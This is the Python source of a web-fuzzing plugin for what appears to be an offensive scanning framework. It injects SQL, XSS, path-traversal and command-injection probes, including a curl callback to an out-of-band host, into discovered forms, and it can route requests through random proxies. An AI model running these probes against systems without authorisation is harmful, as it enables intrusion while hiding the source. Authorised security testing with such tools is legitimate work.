import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from omnistrike.plugins.base import BasePlugin

class WebFuzzerPlugin(BasePlugin):
    def __init__(self):
        self.proxy_manager = None
        self.fuzz_payloads = [
            ("'", "Potential SQL Injection"),
            ("<script>alert(1)</script>", "Potential Cross-Site Scripting (XSS)"),
            ("../../../etc/passwd", "Potential Directory Traversal"),
            ("$(whoami)", "Potential Command Injection"),
            ("`curl {target}.oob.omnistrike.com`", "Potential Out-of-Band (OOB) Command Injection"),
            ("<img src='http://{target}.oob.omnistrike.com/x'>", "Potential OOB Resource Load")
        ]

    @property
    def name(self):
        return "WebFuzzer"

    @property
    def description(self):
        return "Automated parameter fuzzing to identify common web vulnerabilities."

    async def fuzz_form(self, session, form, target):
        action = form['action']
        method = form['method'].lower()
        inputs = form['inputs']
        findings = []

        if not inputs:
            return findings

        for payload_tmpl, description in self.fuzz_payloads:
            payload = payload_tmpl.format(target=target)
            data = {i: payload for i in inputs}
            try:
                if method == 'post':
                    async with session.post(action, data=data, timeout=3.0) as resp:
                        text = await resp.text()
                else:
                    async with session.get(action, params=data, timeout=3.0) as resp:
                        text = await resp.text()

                # Basic detection logic
                if payload in text or "root:x:0:0" in text or "syntax error" in text.lower():
                    findings.append({
                        "url": action,
                        "parameter": "multiple",
                        "payload": payload,
                        "finding": description
                    })
            except:
                pass
        return findings

    async def run(self, target, data):
        spider_findings = data.get('spider_findings', {})
        if not spider_findings:
            print("[*] No web forms discovered for fuzzing.")
            return

        print(f"[*] Starting automated web fuzzing...")
        fuzz_results = {}

        proxy_url = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
        connector = ProxyConnector.from_url(proxy_url) if proxy_url else None

        async with aiohttp.ClientSession(connector=connector) as session:
            for ip, sdata in spider_findings.items():
                forms = sdata.get('forms', [])
                if not forms:
                    continue

                print(f"[*] Fuzzing {len(forms)} forms on {ip}...")
                ip_findings = []
                for form in forms:
                    findings = await self.fuzz_form(session, form, target)
                    ip_findings.extend(findings)

                if ip_findings:
                    fuzz_results[ip] = ip_findings

        data['fuzzing_findings'] = fuzz_results
        if fuzz_results:
            print(f"[*] Fuzzing complete. Identified {sum(len(v) for v in fuzz_results.values())} potential vulnerabilities!")
        else:
            print(f"[*] Fuzzing complete. No immediate vulnerabilities identified.")
